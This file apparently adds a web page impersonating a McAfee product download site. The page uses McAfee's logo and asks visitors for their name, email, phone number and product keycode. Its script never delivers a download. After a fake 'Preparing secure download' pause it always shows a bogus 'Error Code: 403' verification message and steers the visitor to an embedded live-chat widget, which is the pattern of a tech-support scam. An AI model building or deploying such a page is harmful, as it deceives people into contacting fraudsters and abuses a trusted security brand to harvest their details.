@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Downlaoding & Installing Information for McAfee ProDuct</title>
+
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '8038c0fbc1e30bb63bd04ffc3d2e1081bc26a7b5';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+<noscript>Powered by <a href="https://www.smartsupp.com" target="_blank">Smartsupp</a></noscript>
+</head>
+
+<body>
+
+<!-- HEADER -->
+<header>
+    <div class="header-container">
+        <div class="logo">
+            <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/3/39/McAfee_Logo_2017.png" alt="Logo">
+        </div>
+
+        <nav>
+            <ul>
+                <li><a href="#">Home</a></li>               
+                <li><a href="#">Support</a></li>
+                <li><a href="#">Security</a></li>
+                <li><a href="#">Products</a></li>
+            </ul>
+        </nav>
+    </div>
+</header>
+
+<!-- MAIN -->
+<section class="main-container">
+
+    <div class="form-box">
+
+        <div class="top-icon">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKQICc2HOqJPRHaXGjkigo8sGqMTHCgSmL2rJ7iI_-A9k4Td1c1_kF7Tnq53uRFRGBKfC6Xps_DfWC0HrDQFtagP3b1WGY192nRsXAKxQXeVXOXYQ3SU_KvGvtkZ-uhYT6VDVV_BZJ78ZUyPzL1uWvd58ZeNVoc7KJcPmH7VwG72GYcdpWO4c-gCez/s4167/vecteezy_mcafee-logo-square-rounded-mcafee-logo-mcafee-logo-free_60100944.png">
+        </div>
+
+        <h2>Download and install McAfee products</h2>
+        <p><br>Enter your details to continue</br></p>
+
+        <div class="input-group">
+            <i class="fas fa-user"></i>
+            <input id="name" type="text" placeholder="Full Name">
+        </div>
+
+        <div class="input-group">
+            <i class="fas fa-envelope"></i>
+            <input id="email" type="email" placeholder="Email Address">
+        </div>
+
+        <div class="input-group">
+            <i class="fas fa-phone"></i>
+            <input id="phone" type="tel" placeholder="Phone Number">
+        </div>
+
+        <div class="input-group">
+            <i class="fas fa-key"></i>
+            <input id="keycode" type="text" placeholder="Keycode">
+        </div>
+
+        <button id="downloadBtn" class="btn">Download Now</button>
+        <p id="message"></p>
+
+    </div>
+
+    <div class="right-sidebar">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjgxEY5NF4KSTluYYcHXk1r3pZzOUHIuGf422PS3RDLFNykZFCWjmU_MwrSBt2Z6DUtmf8KLDaic6MVn5XVd9J8jdMIjpx7qzFGw9AXaRYfPRnXU2X7XctFNjc5v9HbGbck0A3UMqpmdSPw4LxzMEvPYUQpMye4B18rOJOM2a-Gi5VUmtzhDcn4WDkY/s1280/baner.png">
+    </div>
+
+</section>
+
+<!-- FEATURES -->
+<section class="section">
+    <div class="container box-grid">
+
+        <div class="feature-box">
+            <i class="fas fa-shield-alt icon"></i>
+            <h3>Real-Time Protection</h3>
+            <p>Advanced antivirus protection for your device.</p>
+        </div>
+
+        <div class="feature-box">
+            <i class="fas fa-bolt icon"></i>
+            <h3>Fast Performance</h3>
+            <p>Lightweight and efficient security solution.</p>
+        </div>
+
+        <div class="feature-box">
+            <i class="fas fa-lock icon"></i>
+            <h3>Secure Browsing</h3>
+            <p>Protect your data and privacy online.</p>
+        </div>
+
+        <div class="feature-box">
+            <i class="fas fa-sync icon"></i>
+            <h3>Easy Setup</h3>
+            <p>Quick installation and simple activation.</p>
+        </div>
+
+    </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+    <ul>
+        <li><a href="#">About</a></li>
+        <li><a href="#">Privacy</a></li>
+        <li><a href="#">Terms</a></li>
+        <li><a href="#">Support</a></li>
+    </ul>
+</footer>
+
+<!-- SCRIPT -->
+<script>
+const btn = document.getElementById("downloadBtn");
+const message = document.getElementById("message");
+
+btn.onclick = function () {
+
+    const name = document.getElementById("name").value.trim();
+    const email = document.getElementById("email").value.trim();
+    const phone = document.getElementById("phone").value.trim();
+    const keycode = document.getElementById("keycode").value.trim();
+
+    if (!name || !email || !phone || !keycode) {
+        message.style.color = "red";
+        message.innerHTML = `
+            <strong>Error Code: 403</strong><br>
+            We couldn’t proceed with your download due to a verification delay in your profile.<br>
+            Please connect with our support team through <b>Live Chat</b>.
+        `;
+        return;
+    }
+
+    btn.disabled = true;
+
+    message.style.color = "green";
+    message.innerHTML = 'Preparing secure download...';
+
+    setTimeout(() => {
+        message.style.color = "red";
+        message.innerHTML = `
+            <strong>Error Code: 403</strong><br>
+            We couldn’t proceed with your download due to a verification delay in your profile.<br>
+            Please connect with our support team through <b>Live Chat</b>.
+        `;
+        btn.disabled = false;
+    }, 4000);
+
+};
+</script>
+
+</body>
+</html>
